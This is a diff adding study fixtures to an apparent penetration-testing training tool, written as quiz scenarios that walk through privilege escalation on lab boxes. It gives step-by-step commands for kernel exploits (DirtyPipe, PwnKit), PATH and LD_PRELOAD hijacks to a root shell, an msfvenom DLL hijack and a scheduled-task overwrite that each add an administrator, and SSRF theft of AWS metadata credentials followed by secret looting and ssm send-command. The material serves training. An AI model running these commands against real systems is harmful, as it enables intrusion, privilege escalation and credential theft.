@@ -3750,4 +3750,640 @@
   };
   Object.keys(GAPFILL).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL[k]; });
 
+  // --- Phase-6 gap-fill: the five privesc radar modules + the cloud post-exploitation path ---
+  var GAPFILL2 = {
+    "linux-kernel-exploit": {
+      "why": "A kernel exploit is the last resort, not the first, because it can crash the box and cost you the session, but when the misconfiguration checks come up empty a vulnerable kernel is still a clean path to root. The job is matching: read the exact kernel version and distribution, feed them to an exploit-suggester, and only fire a public exploit whose preconditions you actually meet. Modern labs lean on a handful of reliable ones, PwnKit (pkexec), DirtyPipe, Sudo Baron Samedit, and the odd DirtyCow box, so recognise them on sight. Compile on a matching box or use a prebuilt static binary, and read the exploit before you run it so a reboot is a choice, not a surprise.",
+      "cmd": "uname -a",
+      "tool": "sh",
+      "output": "Linux target 5.8.0-53-generic #60-Ubuntu SMP x86_64 GNU/Linux",
+      "signal": "5.8.0-53-generic",
+      "teach": "Kernel 5.8.0 on Ubuntu is in range for DirtyPipe (CVE-2022-0847) and PwnKit. Run an exploit-suggester to confirm the match, then compile and run the one whose preconditions you meet.",
+      "leadup": [
+        {
+          "key": "foothold",
+          "label": "You have a shell",
+          "steps": [
+            {
+              "title": "Confirm who you are",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "id",
+              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
+              "sig": "uid=1000(bob)",
+              "teach": "You are an unprivileged user; after the misconfiguration checks come up empty, the kernel is the next lead."
+            }
+          ]
+        },
+        {
+          "key": "enum",
+          "label": "Misconfig checks found nothing",
+          "steps": [
+            {
+              "title": "No sudo, no SUID, no cron",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "sudo -l 2>/dev/null; echo done",
+              "out": "done",
+              "sig": "done",
+              "teach": "Nothing in sudo, SUID, caps, or cron. A vulnerable kernel is now worth the risk; identify it precisely first."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Kernel LPE is identify, match, read, run. Never fire blind, a mismatched exploit panics the box.",
+        "items": [
+          {
+            "t": "Read the kernel and distro exactly",
+            "d": "The exploit has to match both the kernel version and the distribution. uname -a and the release file give you both.",
+            "demo": [
+              {
+                "run": "uname -r; cat /etc/os-release | head -1",
+                "out": "5.8.0-53-generic\nPRETTY_NAME=\"Ubuntu 20.04.2 LTS\"",
+                "sig": "5.8.0-53-generic"
+              }
+            ],
+            "note": "Write both down; an Ubuntu 20.04 exploit will not run on a Debian kernel of the same number."
+          },
+          {
+            "t": "Run an exploit-suggester",
+            "d": "linux-exploit-suggester.sh (or the Metasploit local_exploit_suggester) ranks public exploits by how well your kernel matches, so you are not guessing.",
+            "demo": [
+              {
+                "run": "./linux-exploit-suggester.sh",
+                "out": "[+] [CVE-2022-0847] DirtyPipe\n   Exposure: highly probable\n[+] [CVE-2021-4034] PwnKit\n   Exposure: probable",
+                "sig": "[CVE-2022-0847] DirtyPipe"
+              }
+            ],
+            "note": "Highly probable means the version and config line up; start there."
+          },
+          {
+            "t": "Read the exploit, then run it",
+            "d": "Read the source for what it does and whether it reboots. PwnKit needs pkexec present; DirtyPipe needs a readable SUID to overwrite. Prefer a self-contained binary.",
+            "demo": [
+              {
+                "run": "./dirtypipe",
+                "out": "Hijacking SUID binary..\nRestoring /usr/bin/su..\n# id",
+                "sig": "# id"
+              }
+            ],
+            "note": "The hash prompt is a root shell; DirtyPipe restores the binary it borrowed, so it is one of the cleaner ones."
+          },
+          {
+            "t": "Prove root",
+            "d": "Confirm the shell is uid 0 before you do anything else, then capture the flag.",
+            "demo": [
+              {
+                "run": "id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "uid=0 is root; the escalation is done."
+          }
+        ]
+      },
+      "situation": "You have an unprivileged shell on a Linux box, sudo -l is empty, and there are no SUID, capability, or cron leads. uname shows 5.8.0. What is the move?",
+      "choices": [
+        "linux-kernel-exploit",
+        "sudo-abuse",
+        "suid-gtfobins",
+        "linux-enum"
+      ],
+      "coach": {
+        "sudo-abuse": "sudo -l already came up empty, so there is no sudo right to abuse here.",
+        "suid-gtfobins": "You already checked SUID binaries and found nothing abusable; the kernel is the remaining lead.",
+        "linux-enum": "You already enumerated; with the misconfig paths exhausted, a matched kernel exploit is the next step."
+      }
+    },
+    "linux-path-hijack": {
+      "why": "A root SUID binary or a root cron job that calls another program by its bare name, not its full path, is handing you root. The shell searches PATH to resolve that name, so if you can put a directory you control at the front of PATH and drop a program with the same name in it, your program runs with the caller's privileges. The whole technique is noticing the relative call: a custom SUID binary that runs backup instead of /usr/bin/backup, or a cron script that calls tar without a path. Find it with strings or ltrace on the binary, then it is three commands to a root shell.",
+      "cmd": "strings /usr/local/bin/backup",
+      "tool": "sh",
+      "output": "Starting backup...\nbackup\ntar czf /opt/backup.tgz /home",
+      "signal": "\nbackup\n",
+      "teach": "The SUID binary calls backup by bare name, not /usr/bin/backup, so it resolves through PATH. Put a writable directory first in PATH, drop a backup program there, and run the SUID binary to execute yours as root.",
+      "leadup": [
+        {
+          "key": "suid",
+          "label": "You found a custom SUID binary",
+          "steps": [
+            {
+              "title": "List SUID binaries",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "find / -perm -4000 -type f 2>/dev/null",
+              "out": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/local/bin/backup",
+              "sig": "/usr/local/bin/backup",
+              "teach": "A non-standard SUID binary (backup) is worth inspecting; the stock ones rarely help."
+            }
+          ]
+        },
+        {
+          "key": "relative",
+          "label": "It calls a command by bare name",
+          "steps": [
+            {
+              "title": "Trace what it runs",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "ltrace /usr/local/bin/backup 2>&1 | grep -i exec",
+              "out": "system(\"backup\")",
+              "sig": "system(\"backup\")",
+              "teach": "system(\"backup\") with no slash means PATH decides which backup runs; that is your hook."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "PATH hijack is find the relative call, point PATH at a directory you own, drop your binary, trigger it.",
+        "items": [
+          {
+            "t": "Confirm the call is relative",
+            "d": "strings or ltrace on the SUID binary (or reading the cron script) shows whether it calls a program by bare name. A leading slash means no hijack.",
+            "demo": [
+              {
+                "run": "strings /usr/local/bin/backup | grep -v /",
+                "out": "backup",
+                "sig": "backup"
+              }
+            ],
+            "note": "A bare word with no slash is the vulnerable call."
+          },
+          {
+            "t": "Build your replacement",
+            "d": "Write a tiny program with the hijacked name that spawns a shell, make it executable, and put it in a directory you can write.",
+            "demo": [
+              {
+                "run": "echo -e '#!/bin/bash\\n/bin/bash -p' > /tmp/backup && chmod +x /tmp/backup",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "bash -p keeps the elevated privileges instead of dropping them."
+          },
+          {
+            "t": "Put your directory first in PATH",
+            "d": "Prepend /tmp (or wherever your binary lives) so the shell finds yours before the real one.",
+            "demo": [
+              {
+                "run": "export PATH=/tmp:$PATH; which backup",
+                "out": "/tmp/backup",
+                "sig": "/tmp/backup"
+              }
+            ],
+            "note": "which confirms your copy wins the search."
+          },
+          {
+            "t": "Trigger it and confirm root",
+            "d": "Run the SUID binary (or wait for the cron). It calls backup, finds yours, and runs it with its privileges.",
+            "demo": [
+              {
+                "run": "/usr/local/bin/backup; id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "A root shell; the hijack worked."
+          }
+        ]
+      },
+      "situation": "A root-owned SUID binary calls backup by its bare name, and /tmp is writable. What is the move?",
+      "choices": [
+        "linux-path-hijack",
+        "suid-gtfobins",
+        "cron-abuse",
+        "linux-enum"
+      ],
+      "coach": {
+        "suid-gtfobins": "This binary is custom, not a GTFOBins entry; the win is its relative call, not a known abuse.",
+        "cron-abuse": "It is a SUID binary you run on demand, not a cron job; the PATH hijack fires when you run it.",
+        "linux-enum": "You already found the lead; now exploit the relative PATH call."
+      }
+    },
+    "linux-ld-preload": {
+      "why": "When sudo is configured to preserve LD_PRELOAD (env_keep += LD_PRELOAD in the policy), any command you are allowed to run with sudo will load a shared library you point it at, with root privileges. You write a tiny .so whose constructor resets the user id to 0 and drops a shell, then run the permitted sudo command with LD_PRELOAD set to your library. The tell is in sudo -l: look for env_keep carrying LD_PRELOAD or LD_LIBRARY_PATH. It is a clean, reliable root when that one misconfiguration is present, and it does not matter which command you are allowed to run.",
+      "cmd": "sudo -l",
+      "tool": "sh",
+      "output": "Matching Defaults entries for bob:\n    env_reset, env_keep+=LD_PRELOAD\nUser bob may run the following commands:\n    (root) NOPASSWD: /usr/sbin/apache2ctl",
+      "signal": "env_keep+=LD_PRELOAD",
+      "teach": "sudo preserves LD_PRELOAD, so any allowed sudo command loads a library you choose as root. Compile a .so that sets uid 0 and spawns a shell, then run apache2ctl under sudo with LD_PRELOAD pointed at it.",
+      "leadup": [
+        {
+          "key": "sudo",
+          "label": "sudo -l shows an env_keep",
+          "steps": [
+            {
+              "title": "Read the sudo policy",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "sudo -l",
+              "out": "env_reset, env_keep+=LD_PRELOAD\n    (root) NOPASSWD: /usr/sbin/apache2ctl",
+              "sig": "env_keep+=LD_PRELOAD",
+              "teach": "The preserved LD_PRELOAD is the whole vulnerability; the specific allowed command barely matters."
+            }
+          ]
+        },
+        {
+          "key": "compiler",
+          "label": "A compiler is available",
+          "steps": [
+            {
+              "title": "Is gcc present",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "which gcc cc 2>/dev/null",
+              "out": "/usr/bin/gcc",
+              "sig": "/usr/bin/gcc",
+              "teach": "gcc lets you build the .so on the box; otherwise cross-compile a matching one and upload it."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "LD_PRELOAD abuse is confirm the env_keep, build a constructor .so, run the allowed sudo command with LD_PRELOAD set.",
+        "items": [
+          {
+            "t": "Confirm LD_PRELOAD is preserved",
+            "d": "sudo -l must show env_keep carrying LD_PRELOAD (or LD_LIBRARY_PATH). Without it, sudo strips the variable and this does nothing.",
+            "demo": [
+              {
+                "run": "sudo -l | grep -i ld_preload",
+                "out": "env_reset, env_keep+=LD_PRELOAD",
+                "sig": "env_keep+=LD_PRELOAD"
+              }
+            ],
+            "note": "LD_LIBRARY_PATH works the same way with a slightly different payload."
+          },
+          {
+            "t": "Write the library",
+            "d": "A C file with a constructor that sets the real and effective uid to 0 and execs a shell. Compile it as a shared object.",
+            "demo": [
+              {
+                "run": "gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "The constructor runs the instant the library loads, before the real program does anything."
+          },
+          {
+            "t": "Run the allowed command with your library",
+            "d": "Invoke the permitted sudo command, setting LD_PRELOAD to your .so. sudo keeps the variable, the library loads as root, and your constructor fires.",
+            "demo": [
+              {
+                "run": "sudo LD_PRELOAD=/tmp/x.so /usr/sbin/apache2ctl",
+                "out": "# id",
+                "sig": "# id"
+              }
+            ],
+            "note": "The command you run is irrelevant; the library elevates before it starts."
+          },
+          {
+            "t": "Confirm root",
+            "d": "Check the shell is uid 0, then capture the flag.",
+            "demo": [
+              {
+                "run": "id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Root via one preserved environment variable."
+          }
+        ]
+      },
+      "situation": "sudo -l shows env_keep+=LD_PRELOAD and one NOPASSWD command, and gcc is on the box. What is the move?",
+      "choices": [
+        "linux-ld-preload",
+        "sudo-abuse",
+        "suid-gtfobins",
+        "linux-enum"
+      ],
+      "coach": {
+        "sudo-abuse": "The allowed command is not itself GTFOBins-abusable; the preserved LD_PRELOAD is the actual hole.",
+        "suid-gtfobins": "This is a sudo env misconfiguration, not a SUID binary.",
+        "linux-enum": "You already found the env_keep lead; now build the .so and use it."
+      }
+    },
+    "windows-dll-hijack": {
+      "why": "A privileged process that loads a DLL by name, from a directory you can write or from a path where the DLL is missing, will load yours instead and run your code as that process. Windows searches a fixed order of directories for a DLL, and when a high-privilege service looks in a writable folder first, or looks for a DLL that is not there (a phantom DLL), you drop a malicious one and get its privileges on the next start. You find it with Procmon, watching for a NAME NOT FOUND or a load from a writable path, then plant a DLL whose entry point runs your payload. It is a quieter escalation than swapping a service binary and it survives patches that only fix known services.",
+      "cmd": "icacls \"C:\\Program Files\\VulnApp\"",
+      "tool": "cmd",
+      "output": "C:\\Program Files\\VulnApp BUILTIN\\Users:(OI)(CI)(M)\n                       NT AUTHORITY\\SYSTEM:(OI)(CI)(F)",
+      "signal": "BUILTIN\\Users:(OI)(CI)(M)",
+      "teach": "Users have Modify (M) on the app directory, and its SYSTEM service loads a DLL from there. Drop a malicious DLL with the name the service expects and restart it to run as SYSTEM.",
+      "leadup": [
+        {
+          "key": "service",
+          "label": "A service runs as SYSTEM",
+          "steps": [
+            {
+              "title": "Find a non-default service",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "sc qc VulnAppSvc",
+              "out": "SERVICE_START_NAME   : LocalSystem\nBINARY_PATH_NAME     : C:\\Program Files\\VulnApp\\svc.exe",
+              "sig": "SERVICE_START_NAME   : LocalSystem",
+              "teach": "A third-party service running as LocalSystem is the prize; now check whether you can influence what it loads."
+            }
+          ]
+        },
+        {
+          "key": "procmon",
+          "label": "Procmon shows a hijackable load",
+          "steps": [
+            {
+              "title": "Watch its DLL loads",
+              "tool": "procmon",
+              "where": "target",
+              "cmd": "Procmon filter: Process is svc.exe, Result is NAME NOT FOUND, Path ends with .dll",
+              "out": "svc.exe  CreateFile  C:\\Program Files\\VulnApp\\config.dll  NAME NOT FOUND",
+              "sig": "NAME NOT FOUND",
+              "teach": "The service looks for config.dll in a folder you can write and does not find it; that missing DLL is your slot."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "DLL hijack is find a privileged load from a writable or missing path, plant a DLL with that name, restart the process.",
+        "items": [
+          {
+            "t": "Find the writable load",
+            "d": "Procmon with a NAME NOT FOUND filter on the target process shows DLLs it tries to load and cannot, or loads from a writable directory. Confirm you can write that directory with icacls.",
+            "demo": [
+              {
+                "run": "icacls \"C:\\Program Files\\VulnApp\"",
+                "out": "BUILTIN\\Users:(OI)(CI)(M)",
+                "sig": "BUILTIN\\Users:(OI)(CI)(M)"
+              }
+            ],
+            "note": "(M) or (F) for Users or Everyone means you can drop the DLL there."
+          },
+          {
+            "t": "Build the DLL",
+            "d": "Compile a DLL whose DllMain runs your payload on attach. msfvenom produces one that adds an admin or returns a shell.",
+            "demo": [
+              {
+                "run": "msfvenom -p windows/x64/exec CMD=\"net localgroup administrators bob /add\" -f dll -o config.dll",
+                "out": "Saved as: config.dll",
+                "sig": "Saved as: config.dll"
+              }
+            ],
+            "note": "Keep the payload quick; DllMain should not block the host process."
+          },
+          {
+            "t": "Plant it with the expected name",
+            "d": "Copy your DLL into the writable directory using the exact name the process looked for.",
+            "demo": [
+              {
+                "run": "copy config.dll \"C:\\Program Files\\VulnApp\\config.dll\"",
+                "out": "        1 file(s) copied.",
+                "sig": "1 file(s) copied."
+              }
+            ],
+            "note": "The name must match exactly what Procmon showed."
+          },
+          {
+            "t": "Restart the service and confirm",
+            "d": "Restart the service (or reboot, or wait for its trigger). It loads your DLL as SYSTEM and runs your payload.",
+            "demo": [
+              {
+                "run": "sc stop VulnAppSvc & sc start VulnAppSvc & whoami",
+                "out": "nt authority\\system",
+                "sig": "nt authority\\system"
+              }
+            ],
+            "note": "A SYSTEM context confirms the hijack; capture proof."
+          }
+        ]
+      },
+      "situation": "A LocalSystem service loads config.dll from C:\\Program Files\\VulnApp, Procmon shows NAME NOT FOUND, and Users have Modify on that folder. What is the move?",
+      "choices": [
+        "windows-dll-hijack",
+        "weak-service-permissions",
+        "unquoted-service-path",
+        "windows-enum"
+      ],
+      "coach": {
+        "weak-service-permissions": "You cannot reconfigure the service itself here; the lever is the DLL it loads from a writable path.",
+        "unquoted-service-path": "The binary path is quoted; the weakness is the missing DLL, not the path parsing.",
+        "windows-enum": "You already found the hijackable load; now plant the DLL."
+      }
+    },
+    "windows-schtask-abuse": {
+      "why": "A scheduled task that runs as SYSTEM or an administrator, and executes a program or script in a location you can write, is a direct path to its privileges. You overwrite the file the task runs, then wait for its trigger or start it yourself, and your code runs elevated. The tell is in schtasks /query /v: a task whose Run As User is SYSTEM and whose Task To Run points at a writable path, or a task whose own file ACL lets you edit it. Check the target with icacls before you touch it, and keep a copy of the original so the box still works afterward.",
+      "cmd": "schtasks /query /v /fo LIST",
+      "tool": "cmd",
+      "output": "TaskName:      \\VulnBackup\nRun As User:   SYSTEM\nTask To Run:   C:\\Scripts\\backup.bat\nSchedule:      At 02:00 every day",
+      "signal": "Run As User:   SYSTEM",
+      "teach": "VulnBackup runs backup.bat as SYSTEM every day. If C:\\Scripts is writable, overwrite backup.bat with your payload and the task runs it as SYSTEM at the next trigger.",
+      "leadup": [
+        {
+          "key": "task",
+          "label": "A task runs as SYSTEM",
+          "steps": [
+            {
+              "title": "List tasks with details",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "schtasks /query /v /fo LIST | findstr /i \"TaskName Run Task\"",
+              "out": "TaskName:      \\VulnBackup\nRun As User:   SYSTEM\nTask To Run:   C:\\Scripts\\backup.bat",
+              "sig": "Run As User:   SYSTEM",
+              "teach": "A SYSTEM task pointing at a script is the lead; the question is whether you can edit what it runs."
+            }
+          ]
+        },
+        {
+          "key": "acl",
+          "label": "Its target is writable",
+          "steps": [
+            {
+              "title": "Check the script ACL",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "icacls C:\\Scripts\\backup.bat",
+              "out": "C:\\Scripts\\backup.bat BUILTIN\\Users:(F)",
+              "sig": "BUILTIN\\Users:(F)",
+              "teach": "Full control for Users means you can overwrite the script the SYSTEM task runs."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Scheduled-task abuse is find a SYSTEM task with a writable target, back up the original, write your payload, trigger it.",
+        "items": [
+          {
+            "t": "Find the SYSTEM task and its target",
+            "d": "schtasks /query /v lists every task with its Run As User and the file it runs. You want SYSTEM or an admin, pointing at a path or file you can write.",
+            "demo": [
+              {
+                "run": "schtasks /query /v /fo LIST | findstr /i \"Run As User\"",
+                "out": "Run As User:   SYSTEM",
+                "sig": "Run As User:   SYSTEM"
+              }
+            ],
+            "note": "Also check tasks you can modify directly, not just their targets."
+          },
+          {
+            "t": "Confirm you can write the target",
+            "d": "icacls on the script or binary the task runs. Modify or Full for your user or Users is enough.",
+            "demo": [
+              {
+                "run": "icacls C:\\Scripts\\backup.bat",
+                "out": "BUILTIN\\Users:(F)",
+                "sig": "BUILTIN\\Users:(F)"
+              }
+            ],
+            "note": "If only the containing folder is writable, you may be able to replace the file wholesale."
+          },
+          {
+            "t": "Back up, then write your payload",
+            "d": "Copy the original aside, then overwrite the script with a command that gives you access (add an admin, or call a reverse shell).",
+            "demo": [
+              {
+                "run": "copy C:\\Scripts\\backup.bat backup.bak & echo net localgroup administrators bob /add > C:\\Scripts\\backup.bat",
+                "out": "        1 file(s) copied.",
+                "sig": "1 file(s) copied."
+              }
+            ],
+            "note": "Keeping the original means you can restore normal behaviour after you capture proof."
+          },
+          {
+            "t": "Trigger it and confirm",
+            "d": "Run the task now if you can, or wait for its schedule, then check your new privilege.",
+            "demo": [
+              {
+                "run": "schtasks /run /tn \\VulnBackup & net localgroup administrators",
+                "out": "Members\n-------\nAdministrator\nbob",
+                "sig": "bob"
+              }
+            ],
+            "note": "Your account in the administrators group confirms it; log in fresh to use the new rights."
+          }
+        ]
+      },
+      "situation": "schtasks shows a task running as SYSTEM that executes C:\\Scripts\\backup.bat, and icacls shows Users have Full control of that file. What is the move?",
+      "choices": [
+        "windows-schtask-abuse",
+        "weak-service-permissions",
+        "seimpersonate",
+        "windows-enum"
+      ],
+      "coach": {
+        "weak-service-permissions": "This is a scheduled task, not a service; the writable target is what you abuse.",
+        "seimpersonate": "You have no SeImpersonate lead here; the SYSTEM task with a writable script is the direct path.",
+        "windows-enum": "You already found the task; now overwrite its target and trigger it."
+      }
+    },
+    "aws-credential-abuse": {
+      "why": "Pulling temporary AWS keys out of the instance metadata service through an SSRF is only the start; the value is what those keys can do in the account. You load the access key, secret, and session token into the aws CLI, confirm who you are with sts get-caller-identity, then map your permissions and loot: list and read S3 buckets, pull secrets from Secrets Manager and SSM Parameter Store, and look for a privilege-escalation path like iam:PassRole, a writable Lambda, or ssm:SendCommand back onto the instance for a shell. This is beyond the OSCP syllabus, but it is exactly where a real modern engagement goes after a web SSRF, so it belongs on the map. The keys are temporary (an ASIA prefix), so note the session token is mandatory and the clock is running.",
+      "cmd": "aws sts get-caller-identity",
+      "tool": "aws",
+      "output": "{\n    \"UserId\": \"AROAEXAMPLE:i-0abc123\",\n    \"Account\": \"123456789012\",\n    \"Arn\": \"arn:aws:sts::123456789012:assumed-role/web-role/i-0abc123\"\n}",
+      "signal": "assumed-role/web-role",
+      "teach": "The keys are valid and belong to web-role on the instance. Enumerate what that role can do (iam, s3, secretsmanager), then loot buckets and secrets or chain a role-assumption for more access.",
+      "leadup": [
+        {
+          "key": "ssrf",
+          "label": "SSRF reached the metadata service",
+          "steps": [
+            {
+              "title": "Read the role credentials",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s 'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role'",
+              "out": "{\"AccessKeyId\":\"ASIAEXAMPLE123456789\",\"SecretAccessKey\":\"wJalr...\",\"Token\":\"IQoJb...\"}",
+              "sig": "ASIAEXAMPLE123456789",
+              "teach": "The SSRF returned temporary credentials; obol reads them as a cloud credential to try with the CLI."
+            }
+          ]
+        },
+        {
+          "key": "configure",
+          "label": "You loaded the keys",
+          "steps": [
+            {
+              "title": "Set the environment",
+              "tool": "aws",
+              "where": "local",
+              "cmd": "export AWS_ACCESS_KEY_ID=ASIAEXAMPLE123456789 AWS_SECRET_ACCESS_KEY=wJalr... AWS_SESSION_TOKEN=IQoJb...",
+              "out": "",
+              "out_note": "no output",
+              "sig": "",
+              "teach": "Temporary (ASIA) keys require the session token; without it every call fails with an auth error."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Cloud key abuse is confirm the identity, map the permissions, then loot and look for escalation.",
+        "items": [
+          {
+            "t": "Confirm the keys work",
+            "d": "sts get-caller-identity is the free, read-only call that proves the keys are valid and tells you which role you are.",
+            "demo": [
+              {
+                "run": "aws sts get-caller-identity",
+                "out": "\"Arn\": \"arn:aws:sts::123456789012:assumed-role/web-role/i-0abc123\"",
+                "sig": "assumed-role/web-role"
+              }
+            ],
+            "note": "An error here means the token is missing or the keys expired; re-pull from the metadata service."
+          },
+          {
+            "t": "Map what the role can do",
+            "d": "Try the common services. You rarely have iam:ListRolePolicies, so probe by action: list buckets, list secrets, describe instances.",
+            "demo": [
+              {
+                "run": "aws s3 ls; aws secretsmanager list-secrets --query 'SecretList[].Name'",
+                "out": "2023-01-01 app-backups\n[\n    \"prod/db/password\"\n]",
+                "sig": "prod/db/password"
+              }
+            ],
+            "note": "A named secret like prod/db/password is often the whole game."
+          },
+          {
+            "t": "Loot buckets and secrets",
+            "d": "Pull the readable buckets and the secret values. Database passwords and API keys here frequently reuse onto the hosts you are attacking.",
+            "demo": [
+              {
+                "run": "aws secretsmanager get-secret-value --secret-id prod/db/password --query SecretString",
+                "out": "\"{\\\"user\\\":\\\"admin\\\",\\\"pass\\\":\\\"S3cr3tDbPass\\\"}\"",
+                "sig": "S3cr3tDbPass"
+              }
+            ],
+            "note": "Feed recovered credentials straight back into the credential loop."
+          },
+          {
+            "t": "Look for an escalation path",
+            "d": "iam:PassRole with a compute service, a writable Lambda, or ssm:SendCommand onto the instance can turn a limited role into code execution or a higher role.",
+            "demo": [
+              {
+                "run": "aws ssm send-command --document-name AWS-RunShellScript --targets Key=instanceids,Values=i-0abc123 --parameters 'commands=id'",
+                "out": "\"CommandId\": \"a1b2c3d4\"",
+                "sig": "CommandId"
+              }
+            ],
+            "note": "SendCommand onto the instance runs as root/SYSTEM via the SSM agent; that is your shell on the box."
+          }
+        ]
+      },
+      "situation": "An SSRF pulled temporary AWS keys (ASIA...) from the instance metadata service. What turns them into access?",
+      "choices": [
+        "aws-credential-abuse",
+        "ssrf",
+        "content-discovery",
+        "crack-identify"
+      ],
+      "coach": {
+        "ssrf": "The SSRF is how you got the keys; now use them with the aws CLI to enumerate and loot the account.",
+        "content-discovery": "You are past the web app now; the next surface is the cloud account the keys belong to.",
+        "crack-identify": "These are live temporary keys, not a hash to crack; load them into the CLI and use them."
+      }
+    }
+  };
+  Object.keys(GAPFILL2).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL2[k]; });
+
 })(typeof globalThis !== 'undefined' ? globalThis : this);
